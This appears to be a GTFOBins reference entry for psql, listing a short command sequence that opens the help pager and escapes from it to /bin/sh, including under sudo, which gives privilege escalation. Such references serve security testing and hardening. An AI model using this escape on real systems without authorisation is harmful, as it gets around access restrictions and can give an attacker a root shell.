---
description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
functions:
  shell:
    - code: |
        psql
        \?
        !/bin/sh
  sudo:
    - code: |
        psql
        \?
        !/bin/sh
---
